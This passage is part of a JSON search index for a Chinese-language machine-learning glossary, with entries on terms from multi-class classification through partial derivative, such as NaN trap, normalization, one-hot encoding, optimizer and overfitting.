(Momentum)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1312-multi-class-classification","text":"\u533a\u5206\u4e24\u79cd\u4ee5\u4e0a\u7c7b\u522b\u7684\u5206\u7c7b\u95ee\u9898\u3002\u4f8b\u5982\uff0c\u67ab\u6811\u5927\u7ea6\u6709 128 \u79cd\uff0c\u56e0\u6b64\uff0c\u786e\u5b9a\u67ab\u6811\u79cd\u7c7b\u7684\u6a21\u578b\u5c31\u5c5e\u4e8e\u591a\u7c7b\u522b\u6a21\u578b\u3002\u53cd\u4e4b\uff0c\u4ec5\u5c06\u7535\u5b50\u90ae\u4ef6\u5206\u4e3a\u4e24\u7c7b\uff08\"\u5783\u573e\u90ae\u4ef6\"\u548c\"\u975e\u5783\u573e\u90ae\u4ef6\"\uff09\u7684\u6a21\u578b\u5c5e\u4e8e \u4e8c\u5143\u5206\u7c7b\u6a21\u578b \u3002","title":"13.12. \u591a\u7c7b\u522b\u5206\u7c7b (multi-class classification)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1313-multinomial-classification","text":"\u4e0e \u591a\u7c7b\u522b\u5206\u7c7b \u7684\u542b\u4e49\u76f8\u540c\u3002","title":"13.13. \u591a\u9879\u5206\u7c7b (multinomial classification)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#14-n","text":"","title":"14. N"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#141-nan-nan-trap","text":"\u6a21\u578b\u4e2d\u7684\u4e00\u4e2a\u6570\u5b57\u5728\u8bad\u7ec3\u671f\u95f4\u53d8\u6210 NaN \uff0c\u8fd9\u4f1a\u5bfc\u81f4\u6a21\u578b\u4e2d\u7684\u5f88\u591a\u6216\u6240\u6709\u5176\u4ed6\u6570\u5b57\u6700\u7ec8\u4e5f\u4f1a\u53d8\u6210 NaN\u3002 NaN \u662f\"\u975e\u6570\u5b57\"\u7684\u7f29\u5199\u3002","title":"14.1. NaN \u9677\u9631 (NaN trap)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#142-negative-class","text":"\u5728 \u4e8c\u5143\u5206\u7c7b \u4e2d\uff0c\u4e00\u79cd\u7c7b\u522b\u79f0\u4e3a\u6b63\u7c7b\u522b\uff0c\u53e6\u4e00\u79cd\u7c7b\u522b\u79f0\u4e3a\u8d1f\u7c7b\u522b\u3002\u6b63\u7c7b\u522b\u662f\u6211\u4eec\u8981\u5bfb\u627e\u7684\u7c7b\u522b\uff0c\u8d1f\u7c7b\u522b\u5219\u662f\u53e6\u4e00\u79cd\u53ef\u80fd\u6027\u3002\u4f8b\u5982\uff0c\u5728\u533b\u5b66\u68c0\u67e5\u4e2d\uff0c\u8d1f\u7c7b\u522b\u53ef\u4ee5\u662f\"\u975e\u80bf\u7624\"\u3002\u5728\u7535\u5b50\u90ae\u4ef6\u5206\u7c7b\u5668\u4e2d\uff0c\u8d1f\u7c7b\u522b\u53ef\u4ee5\u662f\"\u975e\u5783\u573e\u90ae\u4ef6\"\u3002\u53e6\u8bf7\u53c2\u9605 \u6b63\u7c7b\u522b \u3002","title":"14.2. \u8d1f\u7c7b\u522b (negative class)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#143-neural-network","text":"\u4e00\u79cd\u6a21\u578b\uff0c\u7075\u611f\u6765\u6e90\u4e8e\u8111\u90e8\u7ed3\u6784\uff0c\u7531\u591a\u4e2a\u5c42\u6784\u6210\uff08\u81f3\u5c11\u6709\u4e00\u4e2a\u662f \u9690\u85cf\u5c42 \uff09\uff0c\u6bcf\u4e2a\u5c42\u90fd\u5305\u542b\u7b80\u5355\u76f8\u8fde\u7684\u5355\u5143\u6216 \u795e\u7ecf\u5143 \uff08\u5177\u6709\u975e\u7ebf\u6027\u5173\u7cfb\uff09\u3002","title":"14.3. \u795e\u7ecf\u7f51\u7edc (neural network)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#144-neuron","text":"\u795e\u7ecf\u7f51\u7edc \u4e2d\u7684\u8282\u70b9\uff0c\u901a\u5e38\u4f1a\u63a5\u6536\u591a\u4e2a\u8f93\u5165\u503c\u5e76\u751f\u6210\u4e00\u4e2a\u8f93\u51fa\u503c\u3002\u795e\u7ecf\u5143\u901a\u8fc7\u5c06 \u6fc0\u6d3b\u51fd\u6570 \uff08\u975e\u7ebf\u6027\u8f6c\u6362\uff09\u5e94\u7528\u4e8e\u8f93\u5165\u503c\u7684\u52a0\u6743\u548c\u6765\u8ba1\u7b97\u8f93\u51fa\u503c\u3002","title":"14.4. \u795e\u7ecf\u5143 (neuron)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#145-node","text":"\u591a\u542b\u4e49\u672f\u8bed\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e0b\u5217\u4e24\u79cd\u542b\u4e49\u4e4b\u4e00\uff1a \u9690\u85cf\u5c42 \u4e2d\u7684\u795e\u7ecf\u5143\u3002 TensorFlow \u56fe \u4e2d\u7684\u64cd\u4f5c\u3002","title":"14.5. \u8282\u70b9 (node)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#146-normalization","text":"\u5c06\u5b9e\u9645\u7684\u503c\u533a\u95f4\u8f6c\u6362\u4e3a\u6807\u51c6\u7684\u503c\u533a\u95f4\uff08\u901a\u5e38\u4e3a -1 \u5230 +1 \u6216 0 \u5230 1\uff09\u7684\u8fc7\u7a0b\u3002\u4f8b\u5982\uff0c\u5047\u8bbe\u67d0\u4e2a\u7279\u5f81\u7684\u81ea\u7136\u533a\u95f4\u662f 800 \u5230 6000\u3002\u901a\u8fc7\u51cf\u6cd5\u548c\u9664\u6cd5\u8fd0\u7b97\uff0c\u60a8\u53ef\u4ee5\u5c06\u8fd9\u4e9b\u503c\u6807\u51c6\u5316\u4e3a\u4f4d\u4e8e -1 \u5230 +1 \u533a\u95f4\u5185\u3002 \u53e6\u8bf7\u53c2\u9605 \u7f29\u653e \u3002","title":"14.6. \u6807\u51c6\u5316 (normalization)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#147-numerical-data","text":"\u7528\u6574\u6570\u6216\u5b9e\u6570\u8868\u793a\u7684 \u7279\u5f81 \u3002\u4f8b\u5982\uff0c\u5728\u623f\u5730\u4ea7\u6a21\u578b\u4e2d\uff0c\u60a8\u53ef\u80fd\u4f1a\u7528\u6570\u503c\u6570\u636e\u8868\u793a\u623f\u5b50\u5927\u5c0f\uff08\u4ee5\u5e73\u65b9\u82f1\u5c3a\u6216\u5e73\u65b9\u7c73\u4e3a\u5355\u4f4d\uff09\u3002\u5982\u679c\u7528\u6570\u503c\u6570\u636e\u8868\u793a\u7279\u5f81\uff0c\u5219\u53ef\u4ee5\u8868\u660e\u7279\u5f81\u7684\u503c\u76f8\u4e92\u4e4b\u95f4\u5177\u6709\u6570\u5b66\u5173\u7cfb\uff0c\u5e76\u4e14\u4e0e\u6807\u7b7e\u53ef\u80fd\u4e5f\u6709\u6570\u5b66\u5173\u7cfb\u3002\u4f8b\u5982\uff0c\u5982\u679c\u7528\u6570\u503c\u6570\u636e\u8868\u793a\u623f\u5b50\u5927\u5c0f\uff0c\u5219\u53ef\u4ee5\u8868\u660e\u9762\u79ef\u4e3a 200 \u5e73\u65b9\u7c73\u7684\u623f\u5b50\u662f\u9762\u79ef\u4e3a 100 \u5e73\u65b9\u7c73\u7684\u623f\u5b50\u7684\u4e24\u500d\u3002\u6b64\u5916\uff0c\u623f\u5b50\u9762\u79ef\u7684\u5e73\u65b9\u7c73\u6570\u53ef\u80fd\u4e0e\u623f\u4ef7\u5b58\u5728\u4e00\u5b9a\u7684\u6570\u5b66\u5173\u7cfb\u3002 \u5e76\u975e\u6240\u6709\u6574\u6570\u6570\u636e\u90fd\u5e94\u8868\u793a\u6210\u6570\u503c\u6570\u636e\u3002\u4f8b\u5982\uff0c\u4e16\u754c\u4e0a\u67d0\u4e9b\u5730\u533a\u7684\u90ae\u653f\u7f16\u7801\u662f\u6574\u6570\uff0c\u4f46\u5728\u6a21\u578b\u4e2d\uff0c\u4e0d\u5e94\u5c06\u6574\u6570\u90ae\u653f\u7f16\u7801\u8868\u793a\u6210\u6570\u503c\u6570\u636e\u3002\u8fd9\u662f\u56e0\u4e3a\u90ae\u653f\u7f16\u7801 20000 \u5728\u6548\u529b\u4e0a\u5e76\u4e0d\u662f\u90ae\u653f\u7f16\u7801 10000 \u7684\u4e24\u500d\uff08\u6216\u4e00\u534a\uff09\u3002\u6b64\u5916\uff0c\u867d\u7136\u4e0d\u540c\u7684\u90ae\u653f\u7f16\u7801\u786e\u5b9e\u4e0e\u4e0d\u540c\u7684\u623f\u5730\u4ea7\u4ef7\u503c\u6709\u5173\uff0c\u4f46\u6211\u4eec\u4e5f\u4e0d\u80fd\u5047\u8bbe\u90ae\u653f\u7f16\u7801\u4e3a 20000 \u7684\u623f\u5730\u4ea7\u5728\u4ef7\u503c\u4e0a\u662f\u90ae\u653f\u7f16\u7801\u4e3a 10000 \u7684\u623f\u5730\u4ea7\u7684\u4e24\u500d\u3002\u90ae\u653f\u7f16\u7801\u5e94\u8868\u793a\u6210 \u5206\u7c7b\u6570\u636e \u3002 \u6570\u503c\u7279\u5f81\u6709\u65f6\u79f0\u4e3a \u8fde\u7eed\u7279\u5f81 \u3002","title":"14.7. \u6570\u503c\u6570\u636e (numerical data)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#148-numpy","text":"\u4e00\u4e2a \u5f00\u653e\u6e90\u4ee3\u7801\u6570\u5b66\u5e93 \uff0c\u5728 Python \u4e2d\u63d0\u4f9b\u9ad8\u6548\u7684\u6570\u7ec4\u64cd\u4f5c\u3002 Pandas \u5efa\u7acb\u5728 Numpy \u4e4b\u4e0a\u3002","title":"14.8. Numpy"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#15-o","text":"","title":"15. O"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#151-objective","text":"\u7b97\u6cd5\u5c1d\u8bd5\u4f18\u5316\u7684\u6307\u6807\u3002","title":"15.1. \u76ee\u6807 (objective)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#152-offline-inference","text":"\u751f\u6210\u4e00\u7ec4 \u9884\u6d4b \uff0c\u5b58\u50a8\u8fd9\u4e9b\u9884\u6d4b\uff0c\u7136\u540e\u6839\u636e\u9700\u6c42\u68c0\u7d22\u8fd9\u4e9b\u9884\u6d4b\u3002\u4e0e \u5728\u7ebf\u63a8\u65ad \u76f8\u5bf9\u3002","title":"15.2. \u79bb\u7ebf\u63a8\u65ad (offline inference)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#153-one-hot-encoding","text":"\u4e00\u79cd\u7a00\u758f\u5411\u91cf\uff0c\u5176\u4e2d\uff1a \u4e00\u4e2a\u5143\u7d20\u8bbe\u4e3a 1\u3002 \u6240\u6709\u5176\u4ed6\u5143\u7d20\u5747\u8bbe\u4e3a 0\u3002 \u72ec\u70ed\u7f16\u7801\u5e38\u7528\u4e8e\u8868\u793a\u62e5\u6709\u6709\u9650\u4e2a\u53ef\u80fd\u503c\u7684\u5b57\u7b26\u4e32\u6216\u6807\u8bc6\u7b26\u3002\u4f8b\u5982\uff0c\u5047\u8bbe\u67d0\u4e2a\u6307\u5b9a\u7684\u690d\u7269\u5b66\u6570\u636e\u96c6\u8bb0\u5f55\u4e86 15000 \u4e2a\u4e0d\u540c\u7684\u7269\u79cd\uff0c\u5176\u4e2d\u6bcf\u4e2a\u7269\u79cd\u90fd\u7528\u72ec\u4e00\u65e0\u4e8c\u7684\u5b57\u7b26\u4e32\u6807\u8bc6\u7b26\u6765\u8868\u793a\u3002\u5728\u7279\u5f81\u5de5\u7a0b\u8fc7\u7a0b\u4e2d\uff0c\u60a8\u53ef\u80fd\u9700\u8981\u5c06\u8fd9\u4e9b\u5b57\u7b26\u4e32\u6807\u8bc6\u7b26\u7f16\u7801\u4e3a\u72ec\u70ed\u5411\u91cf\uff0c\u5411\u91cf\u7684\u5927\u5c0f\u4e3a 15000\u3002","title":"15.3. \u72ec\u70ed\u7f16\u7801 (one-hot encoding)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#154-one-shot-learning","text":"\u4e00\u79cd\u673a\u5668\u5b66\u4e60\u65b9\u6cd5\uff0c\u901a\u5e38\u7528\u4e8e\u5bf9\u8c61\u5206\u7c7b\uff0c\u65e8\u5728\u901a\u8fc7\u5355\u4e2a\u8bad\u7ec3\u6837\u672c\u5b66\u4e60\u6709\u6548\u7684\u5206\u7c7b\u5668\u3002 \u53e6\u8bf7\u53c2\u9605 \u5c11\u91cf\u6837\u672c\u5b66\u4e60 \u3002","title":"15.4. \u5355\u6837\u672c\u5b66\u4e60\uff08one-shot learning\uff0c\u901a\u5e38\u7528\u4e8e\u5bf9\u8c61\u5206\u7c7b\uff09"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#155-one-vs-all","text":"\u5047\u8bbe\u67d0\u4e2a\u5206\u7c7b\u95ee\u9898\u6709 N \u79cd\u53ef\u80fd\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u4e00\u5bf9\u591a\u89e3\u51b3\u65b9\u6848\u5c06\u5305\u542b N \u4e2a\u5355\u72ec\u7684 \u4e8c\u5143\u5206\u7c7b\u5668 - \u4e00\u4e2a\u4e8c\u5143\u5206\u7c7b\u5668\u5bf9\u5e94\u4e00\u79cd\u53ef\u80fd\u7684\u7ed3\u679c\u3002\u4f8b\u5982\uff0c\u5047\u8bbe\u67d0\u4e2a\u6a21\u578b\u7528\u4e8e\u533a\u5206\u6837\u672c\u5c5e\u4e8e\u52a8\u7269\u3001\u852c\u83dc\u8fd8\u662f\u77ff\u7269\uff0c\u4e00\u5bf9\u591a\u89e3\u51b3\u65b9\u6848\u5c06\u63d0\u4f9b\u4e0b\u5217\u4e09\u4e2a\u5355\u72ec\u7684\u4e8c\u5143\u5206\u7c7b\u5668\uff1a \u52a8\u7269\u548c\u975e\u52a8\u7269 \u852c\u83dc\u548c\u975e\u852c\u83dc \u77ff\u7269\u548c\u975e\u77ff\u7269","title":"15.5. \u4e00\u5bf9\u591a (one-vs.-all)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#156-online-inference","text":"\u6839\u636e\u9700\u6c42\u751f\u6210 \u9884\u6d4b \u3002\u4e0e \u79bb\u7ebf\u63a8\u65ad \u76f8\u5bf9\u3002","title":"15.6. \u5728\u7ebf\u63a8\u65ad (online inference)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#157-op-operation","text":"TensorFlow \u56fe\u4e2d\u7684\u8282\u70b9\u3002\u5728 TensorFlow \u4e2d\uff0c\u4efb\u4f55\u521b\u5efa\u3001\u64cd\u7eb5\u6216\u9500\u6bc1 \u5f20\u91cf \u7684\u8fc7\u7a0b\u90fd\u5c5e\u4e8e\u64cd\u4f5c\u3002\u4f8b\u5982\uff0c\u77e9\u9635\u76f8\u4e58\u5c31\u662f\u4e00\u79cd\u64cd\u4f5c\uff0c\u8be5\u64cd\u4f5c\u4ee5\u4e24\u4e2a\u5f20\u91cf\u4f5c\u4e3a\u8f93\u5165\uff0c\u5e76\u751f\u6210\u4e00\u4e2a\u5f20\u91cf\u4f5c\u4e3a\u8f93\u51fa\u3002","title":"15.7. \u64cd\u4f5c (op, Operation)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#158-optimizer","text":"\u68af\u5ea6\u4e0b\u964d\u6cd5 \u7684\u4e00\u79cd\u5177\u4f53\u5b9e\u73b0\u3002TensorFlow \u7684\u4f18\u5316\u5668\u57fa\u7c7b\u662f tf.train.Optimizer \u3002\u4e0d\u540c\u7684\u4f18\u5316\u5668\u53ef\u80fd\u4f1a\u5229\u7528\u4ee5\u4e0b\u4e00\u4e2a\u6216\u591a\u4e2a\u6982\u5ff5\u6765\u589e\u5f3a\u68af\u5ea6\u4e0b\u964d\u6cd5\u5728\u6307\u5b9a \u8bad\u7ec3\u96c6 \u4e2d\u7684\u6548\u679c\uff1a \u52a8\u91cf (Momentum) \u66f4\u65b0\u9891\u7387\uff08 AdaGrad = ADAptive GRADient descent\uff1b Adam = ADAptive with Momentum\uff1bRMSProp\uff09 \u7a00\u758f\u6027/\u6b63\u5219\u5316 ( Ftrl ) \u66f4\u590d\u6742\u7684\u6570\u5b66\u65b9\u6cd5\uff08 Proximal \uff0c\u7b49\u7b49\uff09 \u751a\u81f3\u8fd8\u5305\u62ec NN \u9a71\u52a8\u7684\u4f18\u5316\u5668 \u3002","title":"15.8. \u4f18\u5316\u5668 (optimizer)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#159-outlier","text":"\u4e0e\u5927\u591a\u6570\u5176\u4ed6\u503c\u5dee\u522b\u5f88\u5927\u7684\u503c\u3002\u5728\u673a\u5668\u5b66\u4e60\u4e2d\uff0c\u4e0b\u5217\u6240\u6709\u503c\u90fd\u662f\u79bb\u7fa4\u503c\u3002 \u7edd\u5bf9\u503c\u5f88\u9ad8\u7684 \u6743\u91cd \u3002 \u4e0e\u5b9e\u9645\u503c\u76f8\u5dee\u5f88\u5927\u7684\u9884\u6d4b\u503c\u3002 \u503c\u6bd4\u5e73\u5747\u503c\u9ad8\u5927\u7ea6 3 \u4e2a\u6807\u51c6\u504f\u5dee\u7684\u8f93\u5165\u6570\u636e\u3002 \u79bb\u7fa4\u503c\u5e38\u5e38\u4f1a\u5bfc\u81f4\u6a21\u578b\u8bad\u7ec3\u51fa\u73b0\u95ee\u9898\u3002","title":"15.9. \u79bb\u7fa4\u503c (outlier)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1510-output-layer","text":"\u795e\u7ecf\u7f51\u7edc\u7684\"\u6700\u540e\"\u4e00\u5c42\uff0c\u4e5f\u662f\u5305\u542b\u7b54\u6848\u7684\u5c42\u3002","title":"15.10. \u8f93\u51fa\u5c42 (output layer)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1511-overfitting","text":"\u521b\u5efa\u7684\u6a21\u578b\u4e0e \u8bad\u7ec3\u6570\u636e \u8fc7\u4e8e\u5339\u914d\uff0c\u4ee5\u81f4\u4e8e\u6a21\u578b\u65e0\u6cd5\u6839\u636e\u65b0\u6570\u636e\u505a\u51fa\u6b63\u786e\u7684\u9884\u6d4b\u3002","title":"15.11. \u8fc7\u62df\u5408 (overfitting)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#16-p","text":"","title":"16. P"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#161-pandas","text":"\u9762\u5411\u5217\u7684\u6570\u636e\u5206\u6790 API\u3002\u5f88\u591a\u673a\u5668\u5b66\u4e60\u6846\u67b6\uff08\u5305\u62ec TensorFlow\uff09\u90fd\u652f\u6301\u5c06 Pandas \u6570\u636e\u7ed3\u6784\u4f5c\u4e3a\u8f93\u5165\u3002\u8bf7\u53c2\u9605 Pandas \u6587\u6863 \u3002","title":"16.1. Pandas"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#162-parameter","text":"\u673a\u5668\u5b66\u4e60\u7cfb\u7edf\u81ea\u884c\u8bad\u7ec3\u7684\u6a21\u578b\u7684\u53d8\u91cf\u3002\u4f8b\u5982\uff0c \u6743\u91cd \u5c31\u662f\u4e00\u79cd\u53c2\u6570\uff0c\u5b83\u4eec\u7684\u503c\u662f\u673a\u5668\u5b66\u4e60\u7cfb\u7edf\u901a\u8fc7\u8fde\u7eed\u7684\u8bad\u7ec3\u8fed\u4ee3\u9010\u6e10\u5b66\u4e60\u5230\u7684\u3002\u4e0e \u8d85\u53c2\u6570 \u76f8\u5bf9\u3002","title":"16.2. \u53c2\u6570 (parameter)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#163-ps-parameter-server","text":"\u4e00\u79cd\u4f5c\u4e1a\uff0c\u8d1f\u8d23\u5728\u5206\u5e03\u5f0f\u8bbe\u7f6e\u4e2d\u8ddf\u8e2a\u6a21\u578b \u53c2\u6570 \u3002","title":"16.3. \u53c2\u6570\u670d\u52a1\u5668 (PS, Parameter Server)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#164-parameter-update","text":"\u5728\u8bad\u7ec3\u671f\u95f4\uff08\u901a\u5e38\u662f\u5728 \u68af\u5ea6\u4e0b\u964d\u6cd5 \u7684\u5355\u6b21\u8fed\u4ee3\u4e2d\uff09\u8c03\u6574\u6a21\u578b \u53c2\u6570 \u7684\u64cd\u4f5c\u3002","title":"16.4. \u53c2\u6570\u66f4\u65b0 (parameter update)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#165-partial-derivative","text":"\u4e00\u79cd\u5bfc\u6570\uff0c\u9664\u4e00\u4e2a\u53d8\u91cf\u4e4b\u5916\u7684\u6240\u6709\u53d8\u91cf\u90fd\u88ab\u89c6\u4e3a\u5e38\u91cf\u3002\u4f8b\u5982\uff0cf(x, y) \u5bf9 x \u7684\u504f\u5bfc\u6570\u5c31\u662f f(x) \u7684\u5bfc\u6570\uff08\u5373\uff0c\u4f7f y \u4fdd\u6301\u6052\u5b9a\uff09\u3002f \u5bf9 x \u7684\u504f\u5bfc\u6570\u4ec5\u5173\u6ce8 x \u5982\u4f55\u53d8\u5316\uff0c\u800c\u5ffd\u7565\u516c\u5f0f\u4e2d\u7684\u6240\u6709\u5176\u4ed6\u53d8\u91cf\u3002","title":"16.5. \u504f\u5bfc\u6570 (partial 